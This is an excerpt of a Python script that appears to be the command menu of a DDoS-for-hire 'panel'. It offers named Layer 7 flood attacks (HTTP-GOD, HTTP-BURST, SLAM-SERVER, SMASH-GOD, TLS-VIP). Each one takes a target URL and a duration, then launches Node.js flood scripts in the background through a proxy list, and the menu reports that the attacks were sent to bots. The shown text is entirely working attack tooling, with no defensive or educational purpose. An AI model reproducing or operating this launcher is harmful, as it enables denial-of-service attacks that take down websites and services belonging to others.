...
def layer7():
    ...
    print(f"""\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝙃 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi
        ...
        ║HTTP-GOD    --  𝙊𝙑𝙀𝙍 𝙋𝙊𝙒𝙀𝙍 𝙃𝙏𝙏𝙋 𝙁𝙇𝙊𝙊𝘿
        ║HTTP-BURST  --  𝘽𝙐𝙍𝙎𝙏 𝙃𝙏𝙏𝙋 𝙒𝙄𝙏𝙃 𝙄𝙉𝘾𝙍𝙀𝘼𝙎𝙀 𝙁𝙇𝙊𝙊𝘿
        ║SLAM-SERVER --  𝙁𝙇𝙊𝙊𝘿 𝙎𝙀𝙍𝙑𝙀𝙍 𝙒𝙄𝙏𝙃 𝙎𝙇𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆𝙎
        ║SMASH-GOD   --  𝙃𝙄𝙂𝙃 𝙍𝙀𝙌𝙐𝙀𝙎𝙏 𝙁𝙇𝙊𝙊𝘿 𝘼𝙏𝙏𝘼𝘾𝙆
        ║TLS-VIP     --  𝙏𝙇𝙎 𝙁𝙇𝙊𝙊𝘿 𝙒𝙄𝙏𝙃 𝙃𝙄𝙂𝙃 𝙍𝙀𝙌 𝙋𝙎
""")
    ...
    while True:
        ...
        if sinput == "layer7" or sinput == "l7":
            ...
            try:
                target = sin.split()[1]
                port = sin.split()[2]
                os.system(f'cd l4 && screen -dm node tcp.js http://{target} 120 {port}')
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node tls-vip.js {target} {time} 512 10 proxy.txt')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer4()
            except IndexError:
                print("\033[36mExample Usage: TLS-VIP [URL] [TIME]")

        elif sinput == "HTTP-BURST":
            try:
                host = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node http-burst.js POST {host} proxy.txt {time} 512 10')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: HTTP-BURST [URL] [TIME]")

        elif sinput == "SMASH-GOD":
            try:
                host = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node http-burst.js POST {host} proxy.txt {time} 512 10 443')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: SMASH-GOD [URL] [TIME]")

        elif sinput == "SLAM-SERVER":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node slam-server.js {target} {time} 512 10 10')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: SLAM-SERVER [URL] [TIME]")

        elif sinput == "HTTP-GOD":
            try:
                host = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node http-god.js POST {host} proxy.txt {time} 512 10')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: HTTP-GOD [URL] [TIME]")
